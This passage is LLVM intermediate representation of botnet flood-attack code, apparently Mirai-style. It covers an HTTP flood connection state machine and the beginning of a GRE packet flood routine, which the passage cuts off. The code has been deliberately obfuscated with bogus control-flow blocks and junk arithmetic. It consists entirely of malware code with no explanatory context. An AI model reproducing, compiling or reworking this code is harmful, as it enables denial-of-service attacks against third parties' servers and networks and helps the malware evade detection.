  %gen357 = mul i32 %_356, 1
  %_358 = sub i32 0, %4366
  %gen359 = add i32 %_358, 1
  %_360 = sub i32 0, %4366
  %gen361 = add i32 %_360, 1
  %4367 = add nsw i32 %4366, 1
  store i32 %4367, i32* %10, align 4
  br label %originalBB353

originalBB365alteredBB:                           ; preds = %originalBB365, %2453
  %4368 = load i8*, i8** %54, align 8
  %4369 = call i32 @util_strlen(i8* %4368)
  %4370 = icmp slt i32 %4369, 128
  br label %originalBB365

originalBB369alteredBB:                           ; preds = %originalBB369, %2510
  br label %originalBB369

originalBB373alteredBB:                           ; preds = %originalBB373, %2554
  %4371 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4372 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4371, i32 0, i32 6
  %4373 = getelementptr inbounds [257 x i8], [257 x i8]* %4372, i32 0, i32 0
  %4374 = getelementptr inbounds i8, i8* %4373, i64 1
  %4375 = load i8*, i8** %54, align 8
  %4376 = load i32, i32* %10, align 4
  %_374 = sub i32 %4376, 1
  %gen375 = mul i32 %_374, 1
  %_376 = sub i32 0, %4376
  %gen377 = add i32 %_376, 1
  %4377 = add nsw i32 %4376, 1
  %4378 = sext i32 %4377 to i64
  %4379 = getelementptr inbounds i8, i8* %4375, i64 %4378
  %4380 = call i32 @util_strcpy(i8* %4374, i8* %4379)
  br label %originalBB373

originalBB381alteredBB:                           ; preds = %originalBB381, %2581
  br label %originalBB381

originalBB385alteredBB:                           ; preds = %originalBB385, %2598
  br label %originalBB385

originalBB389alteredBB:                           ; preds = %originalBB389, %2615
  %4381 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4382 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4381, i32 0, i32 1
  store i8 1, i8* %4382, align 4
  br label %originalBB389

originalBB393alteredBB:                           ; preds = %originalBB393, %2635
  %4383 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4384 = load i32, i32* %12, align 4
  %4385 = call i8* @table_retrieve_val(i32 44, i32* null)
  %4386 = call i32 @util_stristr(i8* %4383, i32 %4384, i8* %4385)
  %4387 = icmp ne i32 %4386, -1
  br label %originalBB393

originalBB397alteredBB:                           ; preds = %originalBB397, %2688
  %4388 = load i32, i32* %56, align 4
  %_398 = sub i32 0, %4388
  %gen399 = add i32 %_398, 2
  %_400 = sub i32 0, %4388
  %gen401 = add i32 %_400, 2
  %_402 = sub i32 0, %4388
  %gen403 = add i32 %_402, 2
  %4389 = sub nsw i32 %4388, 2
  store i32 %4389, i32* %56, align 4
  br label %originalBB397

originalBB407alteredBB:                           ; preds = %originalBB407, %2731
  %4390 = load i8*, i8** %57, align 8
  %4391 = load i32, i32* %10, align 4
  %4392 = sext i32 %4391 to i64
  %4393 = getelementptr inbounds i8, i8* %4390, i64 %4392
  %4394 = load i8, i8* %4393, align 1
  %4395 = sext i8 %4394 to i32
  %4396 = icmp sle i32 %4395, 57
  br label %originalBB407

originalBB411alteredBB:                           ; preds = %originalBB411, %2755
  br label %originalBB411

originalBB415alteredBB:                           ; preds = %originalBB415, %2826
  %4397 = load i8*, i8** %57, align 8
  %4398 = load i32, i32* %10, align 4
  %4399 = sext i32 %4398 to i64
  %4400 = getelementptr inbounds i8, i8* %4397, i64 %4399
  %4401 = load i8, i8* %4400, align 1
  %4402 = sext i8 %4401 to i32
  %4403 = icmp eq i32 %4402, 34
  br label %originalBB415

originalBB419alteredBB:                           ; preds = %originalBB419, %2850
  %4404 = load i32, i32* %10, align 4
  %_420 = shl i32 %4404, 1
  %4405 = add nsw i32 %4404, 1
  store i32 %4405, i32* %10, align 4
  %4406 = load i8*, i8** %57, align 8
  %4407 = load i32, i32* %10, align 4
  %4408 = sext i32 %4407 to i64
  %4409 = getelementptr inbounds i8, i8* %4406, i64 %4408
  %4410 = load i8*, i8** %57, align 8
  %4411 = load i32, i32* %10, align 4
  %4412 = sext i32 %4411 to i64
  %4413 = getelementptr inbounds i8, i8* %4410, i64 %4412
  %4414 = call i32 @util_strlen(i8* %4413)
  %_421 = shl i32 %4414, 1
  %_422 = shl i32 %4414, 1
  %_423 = shl i32 %4414, 1
  %_424 = sub i32 %4414, 1
  %gen425 = mul i32 %_424, 1
  %_426 = sub i32 0, %4414
  %gen427 = add i32 %_426, 1
  %_428 = sub i32 %4414, 1
  %gen429 = mul i32 %_428, 1
  %_430 = sub i32 0, %4414
  %gen431 = add i32 %_430, 1
  %_432 = sub i32 0, %4414
  %gen433 = add i32 %_432, 1
  %_434 = sub i32 %4414, 1
  %gen435 = mul i32 %_434, 1
  %4415 = sub nsw i32 %4414, 1
  %4416 = sext i32 %4415 to i64
  %4417 = getelementptr inbounds i8, i8* %4409, i64 %4416
  %4418 = load i8, i8* %4417, align 1
  %4419 = sext i8 %4418 to i32
  %4420 = icmp eq i32 %4419, 34
  br label %originalBB419

originalBB439alteredBB:                           ; preds = %originalBB439, %2907
  %4421 = load i32, i32* %27, align 4
  %4422 = load i32, i32* %58, align 4
  %_440 = sub i32 0, %4421
  %gen441 = add i32 %_440, %4422
  %_442 = shl i32 %4421, %4422
  %_443 = shl i32 %4421, %4422
  %_444 = sub i32 %4421, %4422
  %gen445 = mul i32 %_444, %4422
  %_446 = shl i32 %4421, %4422
  %4423 = add i32 %4421, %4422
  %4424 = zext i32 %4423 to i64
  %4425 = call i64 @time(i64* null) #6
  %4426 = icmp sgt i64 %4424, %4425
  br label %originalBB439

originalBB450alteredBB:                           ; preds = %originalBB450, %2934
  %4427 = load i8*, i8** %57, align 8
  %4428 = load i32, i32* %10, align 4
  %4429 = sext i32 %4428 to i64
  %4430 = getelementptr inbounds i8, i8* %4427, i64 %4429
  store i8* %4430, i8** %57, align 8
  %4431 = load i8*, i8** %57, align 8
  %4432 = load i8*, i8** %57, align 8
  %4433 = call i32 @util_strlen(i8* %4432)
  %4434 = call i32 @util_stristr(i8* %4431, i32 %4433, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i32 0, i32 0))
  %4435 = icmp eq i32 %4434, 4
  br label %originalBB450

originalBB454alteredBB:                           ; preds = %originalBB454, %2960
  store i32 7, i32* %10, align 4
  %4436 = load i8*, i8** %57, align 8
  %4437 = getelementptr inbounds i8, i8* %4436, i64 4
  %4438 = load i8, i8* %4437, align 1
  %4439 = sext i8 %4438 to i32
  %4440 = icmp eq i32 %4439, 115
  br label %originalBB454

originalBB458alteredBB:                           ; preds = %originalBB458, %2995
  %4441 = load i8*, i8** %57, align 8
  %4442 = load i32, i32* %10, align 4
  %4443 = sext i32 %4442 to i64
  %4444 = getelementptr inbounds i8, i8* %4441, i64 %4443
  %4445 = load i8, i8* %4444, align 1
  %4446 = sext i8 %4445 to i32
  %4447 = icmp ne i32 %4446, 0
  br label %originalBB458

originalBB462alteredBB:                           ; preds = %originalBB462, %3039
  %4448 = load i8*, i8** %57, align 8
  %4449 = call i32 @util_strlen(i8* %4448)
  %4450 = icmp slt i32 %4449, 128
  br label %originalBB462

originalBB466alteredBB:                           ; preds = %originalBB466, %3085
  %4451 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4452 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4451, i32 0, i32 6
  %4453 = getelementptr inbounds [257 x i8], [257 x i8]* %4452, i32 0, i32 0
  %4454 = getelementptr inbounds i8, i8* %4453, i64 1
  %4455 = load i8*, i8** %57, align 8
  %4456 = load i32, i32* %10, align 4
  %_467 = sub i32 %4456, 1
  %gen468 = mul i32 %_467, 1
  %_469 = shl i32 %4456, 1
  %_470 = shl i32 %4456, 1
  %_471 = sub i32 %4456, 1
  %gen472 = mul i32 %_471, 1
  %_473 = sub i32 %4456, 1
  %gen474 = mul i32 %_473, 1
  %_475 = shl i32 %4456, 1
  %4457 = add nsw i32 %4456, 1
  %4458 = sext i32 %4457 to i64
  %4459 = getelementptr inbounds i8, i8* %4455, i64 %4458
  %4460 = call i32 @util_strcpy(i8* %4454, i8* %4459)
  br label %originalBB466

originalBB479alteredBB:                           ; preds = %originalBB479, %3114
  %4461 = load i8*, i8** %57, align 8
  %4462 = getelementptr inbounds i8, i8* %4461, i64 0
  %4463 = load i8, i8* %4462, align 1
  %4464 = sext i8 %4463 to i32
  %4465 = icmp eq i32 %4464, 47
  br label %originalBB479

originalBB483alteredBB:                           ; preds = %originalBB483, %3144
  %4466 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4467 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4466, i32 0, i32 6
  %4468 = getelementptr inbounds [257 x i8], [257 x i8]* %4467, i32 0, i32 0
  %4469 = getelementptr inbounds i8, i8* %4468, i64 1
  call void @util_zero(i8* %4469, i32 255)
  %4470 = load i8*, i8** %57, align 8
  %4471 = load i32, i32* %10, align 4
  %_484 = sub i32 %4471, 1
  %gen485 = mul i32 %_484, 1
  %_486 = sub i32 0, %4471
  %gen487 = add i32 %_486, 1
  %_488 = shl i32 %4471, 1
  %_489 = sub i32 0, %4471
  %gen490 = add i32 %_489, 1
  %4472 = add nsw i32 %4471, 1
  %4473 = sext i32 %4472 to i64
  %4474 = getelementptr inbounds i8, i8* %4470, i64 %4473
  %4475 = call i32 @util_strlen(i8* %4474)
  %4476 = icmp sgt i32 %4475, 0
  br label %originalBB483

originalBB494alteredBB:                           ; preds = %originalBB494, %3172
  %4477 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4478 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4477, i32 0, i32 6
  %4479 = getelementptr inbounds [257 x i8], [257 x i8]* %4478, i32 0, i32 0
  %4480 = getelementptr inbounds i8, i8* %4479, i64 1
  %4481 = load i8*, i8** %57, align 8
  %4482 = load i32, i32* %10, align 4
  %_495 = sub i32 %4482, 1
  %gen496 = mul i32 %_495, 1
  %_497 = sub i32 0, %4482
  %gen498 = add i32 %_497, 1
  %_499 = sub i32 0, %4482
  %gen500 = add i32 %_499, 1
  %_501 = shl i32 %4482, 1
  %_502 = shl i32 %4482, 1
  %_503 = shl i32 %4482, 1
  %_504 = sub i32 0, %4482
  %gen505 = add i32 %_504, 1
  %4483 = add nsw i32 %4482, 1
  %4484 = sext i32 %4483 to i64
  %4485 = getelementptr inbounds i8, i8* %4481, i64 %4484
  %4486 = call i32 @util_strcpy(i8* %4480, i8* %4485)
  br label %originalBB494

originalBB509alteredBB:                           ; preds = %originalBB509, %3209
  br label %originalBB509

originalBB513alteredBB:                           ; preds = %originalBB513, %3237
  %4487 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4488 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4487, i32 0, i32 9
  %4489 = getelementptr inbounds [9 x i8], [9 x i8]* %4488, i32 0, i32 0
  %4490 = call signext i8 @util_strcmp(i8* %4489, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  %4491 = sext i8 %4490 to i32
  %4492 = icmp ne i32 %4491, 0
  br label %originalBB513

originalBB517alteredBB:                           ; preds = %originalBB517, %3263
  %4493 = load i32, i32* %12, align 4
  %4494 = load i32, i32* %37, align 4
  %4495 = icmp sgt i32 %4493, %4494
  br label %originalBB517

originalBB521alteredBB:                           ; preds = %originalBB521, %3305
  br label %originalBB521

originalBB525alteredBB:                           ; preds = %originalBB525, %3328
  br label %originalBB525

originalBB529alteredBB:                           ; preds = %originalBB529, %3362
  %4496 = call i32* @__errno_location() #7
  store i32 0, i32* %4496, align 4
  %4497 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4498 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4497, i32 0, i32 0
  %4499 = load i32, i32* %4498, align 4
  %4500 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4501 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4500, i32 0, i32 18
  %4502 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4501, i32 0, i32 0
  %4503 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4504 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4503, i32 0, i32 17
  %4505 = load i32, i32* %4504, align 4
  %4506 = sext i32 %4505 to i64
  %4507 = getelementptr inbounds i8, i8* %4502, i64 %4506
  %4508 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4509 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4508, i32 0, i32 17
  %4510 = load i32, i32* %4509, align 4
  %_530 = sub i32 0, 1024
  %gen531 = add i32 %_530, %4510
  %_532 = sub i32 0, 1024
  %gen533 = add i32 %_532, %4510
  %_534 = sub i32 1024, %4510
  %gen535 = mul i32 %_534, %4510
  %_536 = sub i32 0, 1024
  %gen537 = add i32 %_536, %4510
  %4511 = sub nsw i32 1024, %4510
  %4512 = sext i32 %4511 to i64
  %4513 = call i64 @recv(i32 %4499, i8* %4507, i64 %4512, i32 16384)
  %4514 = trunc i64 %4513 to i32
  store i32 %4514, i32* %12, align 4
  %4515 = load i32, i32* %12, align 4
  %4516 = icmp eq i32 %4515, 0
  br label %originalBB529

originalBB541alteredBB:                           ; preds = %originalBB541, %3400
  %4517 = call i32* @__errno_location() #7
  store i32 104, i32* %4517, align 4
  store i32 -1, i32* %12, align 4
  br label %originalBB541

originalBB545alteredBB:                           ; preds = %originalBB545, %3429
  %4518 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4519 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4518, i32 0, i32 0
  %4520 = load i32, i32* %4519, align 4
  %4521 = call i32 @close(i32 %4520)
  %4522 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4523 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4522, i32 0, i32 0
  store i32 -1, i32* %4523, align 4
  %4524 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4525 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4524, i32 0, i32 1
  store i8 0, i8* %4525, align 4
  br label %originalBB545

originalBB549alteredBB:                           ; preds = %originalBB549, %3477
  %4526 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4526, i32 0, i32 17
  %4528 = load i32, i32* %4527, align 4
  br label %originalBB549

originalBB553alteredBB:                           ; preds = %originalBB553, %3562
  %4529 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4530 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4529, i32 0, i32 16
  %4531 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4532 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4531, i32 0, i32 15
  %4533 = load i32, i32* %4532, align 4
  %4534 = sext i32 %4533 to i64
  %4535 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4530, i64 0, i64 %4534
  %4536 = getelementptr inbounds [128 x i8], [128 x i8]* %4535, i32 0, i32 0
  %4537 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4538 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4537, i32 0, i32 18
  %4539 = load i32, i32* %60, align 4
  %4540 = sext i32 %4539 to i64
  %4541 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4538, i64 0, i64 %4540
  %4542 = call i32 @util_strcpy(i8* %4536, i8* %4541)
  %4543 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4544 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4543, i32 0, i32 16
  %4545 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4546 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4545, i32 0, i32 15
  %4547 = load i32, i32* %4546, align 4
  %4548 = sext i32 %4547 to i64
  %4549 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4544, i64 0, i64 %4548
  %4550 = getelementptr inbounds [128 x i8], [128 x i8]* %4549, i32 0, i32 0
  %4551 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4552 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4551, i32 0, i32 16
  %4553 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4554 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4553, i32 0, i32 15
  %4555 = load i32, i32* %4554, align 4
  %4556 = sext i32 %4555 to i64
  %4557 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4552, i64 0, i64 %4556
  %4558 = getelementptr inbounds [128 x i8], [128 x i8]* %4557, i32 0, i32 0
  %4559 = call i32 @util_strlen(i8* %4558)
  %4560 = sext i32 %4559 to i64
  %4561 = getelementptr inbounds i8, i8* %4550, i64 %4560
  %4562 = call i32 @util_strcpy(i8* %4561, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %4563 = load i32, i32* %61, align 4
  %_554 = sub i32 0, %4563
  %gen555 = add i32 %_554, 3
  %_556 = sub i32 0, %4563
  %gen557 = add i32 %_556, 3
  %_558 = shl i32 %4563, 3
  %4564 = add nsw i32 %4563, 3
  %4565 = load i32, i32* %60, align 4
  %_559 = sub i32 0, %4565
  %gen560 = add i32 %_559, %4564
  %_561 = sub i32 0, %4565
  %gen562 = add i32 %_561, %4564
  %_563 = sub i32 %4565, %4564
  %gen564 = mul i32 %_563, %4564
  %_565 = sub i32 %4565, %4564
  %gen566 = mul i32 %_565, %4564
  %_567 = shl i32 %4565, %4564
  %_568 = shl i32 %4565, %4564
  %4566 = add nsw i32 %4565, %4564
  store i32 %4566, i32* %60, align 4
  %4567 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4568 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4567, i32 0, i32 18
  %4569 = load i32, i32* %60, align 4
  %4570 = sext i32 %4569 to i64
  %4571 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4568, i64 0, i64 %4570
  %4572 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4573 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4572, i32 0, i32 17
  %4574 = load i32, i32* %4573, align 4
  %4575 = load i32, i32* %60, align 4
  %_569 = sub i32 0, %4574
  %gen570 = add i32 %_569, %4575
  %_571 = sub i32 %4574, %4575
  %gen572 = mul i32 %_571, %4575
  %_573 = sub i32 0, %4574
  %gen574 = add i32 %_573, %4575
  %_575 = sub i32 0, %4574
  %gen576 = add i32 %_575, %4575
  %_577 = sub i32 0, %4574
  %gen578 = add i32 %_577, %4575
  %_579 = shl i32 %4574, %4575
  %_580 = sub i32 %4574, %4575
  %gen581 = mul i32 %_580, %4575
  %_582 = shl i32 %4574, %4575
  %4576 = sub nsw i32 %4574, %4575
  %4577 = call i32 @util_memsearch(i8* %4571, i32 %4576, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %4577, i32* %61, align 4
  %4578 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4579 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4578, i32 0, i32 18
  %4580 = load i32, i32* %60, align 4
  %4581 = load i32, i32* %61, align 4
  %_583 = sub i32 %4581, 1
  %gen584 = mul i32 %_583, 1
  %4582 = sub nsw i32 %4581, 1
  %_585 = sub i32 0, %4580
  %gen586 = add i32 %_585, %4582
  %_587 = shl i32 %4580, %4582
  %_588 = sub i32 %4580, %4582
  %gen589 = mul i32 %_588, %4582
  %_590 = shl i32 %4580, %4582
  %_591 = shl i32 %4580, %4582
  %4583 = add nsw i32 %4580, %4582
  %4584 = sext i32 %4583 to i64
  %4585 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4579, i64 0, i64 %4584
  store i8 0, i8* %4585, align 1
  %4586 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4587 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4586, i32 0, i32 16
  %4588 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4589 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4588, i32 0, i32 15
  %4590 = load i32, i32* %4589, align 4
  %4591 = sext i32 %4590 to i64
  %4592 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4587, i64 0, i64 %4591
  %4593 = getelementptr inbounds [128 x i8], [128 x i8]* %4592, i32 0, i32 0
  %4594 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4595 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4594, i32 0, i32 16
  %4596 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4597 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4596, i32 0, i32 15
  %4598 = load i32, i32* %4597, align 4
  %4599 = sext i32 %4598 to i64
  %4600 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %4595, i64 0, i64 %4599
  %4601 = getelementptr inbounds [128 x i8], [128 x i8]* %4600, i32 0, i32 0
  %4602 = call i32 @util_strlen(i8* %4601)
  %4603 = sext i32 %4602 to i64
  %4604 = getelementptr inbounds i8, i8* %4593, i64 %4603
  %4605 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4606 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4605, i32 0, i32 18
  %4607 = load i32, i32* %60, align 4
  %4608 = sext i32 %4607 to i64
  %4609 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4606, i64 0, i64 %4608
  %4610 = call i32 @util_strcpy(i8* %4604, i8* %4609)
  %4611 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4612 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4611, i32 0, i32 15
  %4613 = load i32, i32* %4612, align 4
  %_592 = sub i32 %4613, 1
  %gen593 = mul i32 %_592, 1
  %4614 = add nsw i32 %4613, 1
  store i32 %4614, i32* %4612, align 4
  br label %originalBB553

originalBB597alteredBB:                           ; preds = %originalBB597, %3665
  %4615 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4616 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4615, i32 0, i32 14
  store i32 -1, i32* %4616, align 4
  %4617 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4618 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4617, i32 0, i32 1
  store i8 10, i8* %4618, align 4
  br label %originalBB597

originalBB601alteredBB:                           ; preds = %originalBB601, %3707
  %4619 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4620 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4619, i32 0, i32 18
  %4621 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4620, i32 0, i32 0
  %4622 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4623 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4622, i32 0, i32 17
  %4624 = load i32, i32* %4623, align 4
  %4625 = call i32 @util_memsearch(i8* %4621, i32 %4624, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %4625, i32* %62, align 4
  %4626 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4627 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4626, i32 0, i32 18
  %4628 = load i32, i32* %62, align 4
  %4629 = sub nsw i32 %4628, 2
  %4630 = sext i32 %4629 to i64
  %4631 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4627, i64 0, i64 %4630
  store i8 0, i8* %4631, align 1
  %4632 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4632, i32 0, i32 18
  %4634 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4633, i32 0, i32 0
  %4635 = load i32, i32* %62, align 4
  %4636 = call i32 @util_memsearch(i8* %4634, i32 %4635, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %4637 = icmp ne i32 %4636, -1
  br label %originalBB601

originalBB605alteredBB:                           ; preds = %originalBB605, %3753
  %4638 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4639 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4638, i32 0, i32 18
  %4640 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4639, i32 0, i32 0
  %4641 = call i32 @util_atoi(i8* %4640, i32 16)
  store i32 %4641, i32* %63, align 4
  %4642 = load i32, i32* %63, align 4
  %4643 = icmp eq i32 %4642, 0
  br label %originalBB605

originalBB609alteredBB:                           ; preds = %originalBB609, %3779
  %4644 = load i32, i32* %63, align 4
  %_610 = sub i32 0, %4644
  %gen611 = add i32 %_610, 2
  %_612 = sub i32 %4644, 2
  %gen613 = mul i32 %_612, 2
  %_614 = shl i32 %4644, 2
  %_615 = shl i32 %4644, 2
  %_616 = sub i32 0, %4644
  %gen617 = add i32 %_616, 2
  %4645 = add nsw i32 %4644, 2
  %4646 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4647 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4646, i32 0, i32 14
  store i32 %4645, i32* %4647, align 4
  %4648 = load i32, i32* %62, align 4
  store i32 %4648, i32* %59, align 4
  br label %originalBB609

originalBB621alteredBB:                           ; preds = %originalBB621, %3814
  %4649 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4650 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4649, i32 0, i32 1
  store i8 1, i8* %4650, align 4
  br label %originalBB621

originalBB625alteredBB:                           ; preds = %originalBB625, %3833
  br label %originalBB625

originalBB629alteredBB:                           ; preds = %originalBB629, %3851
  %4651 = load i32, i32* %59, align 4
  %4652 = icmp eq i32 %4651, 0
  br label %originalBB629

originalBB633alteredBB:                           ; preds = %originalBB633, %3901
  br label %originalBB633

originalBB637alteredBB:                           ; preds = %originalBB637, %3944
  %4653 = call i32* @__errno_location() #7
  %4654 = load i32, i32* %4653, align 4
  %4655 = icmp ne i32 %4654, 11
  br label %originalBB637

originalBB641alteredBB:                           ; preds = %originalBB641, %3978
  br label %originalBB641

originalBB645alteredBB:                           ; preds = %originalBB645, %4001
  %4656 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4657 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4656, i32 0, i32 1
  store i8 1, i8* %4657, align 4
  br label %originalBB645

originalBB649alteredBB:                           ; preds = %originalBB649, %4028
  br label %originalBB649
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i32 @util_strlen(i8*) #3

declare i32 @util_strcpy(i8*, i8*) #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

declare void @util_zero(i8*, i32) #3

declare i8* @util_itoa(i32, i32, i8*) #3

declare signext i8 @util_strcmp(i8*, i8*) #3

declare i64 @send(i32, i8*, i64, i32) #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #3

declare i32 @util_stristr(i8*, i32, i8*) #3

declare signext i8 @util_strncmp(i8*, i8*, i32) #3

declare i32 @sleep(i32) #3

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
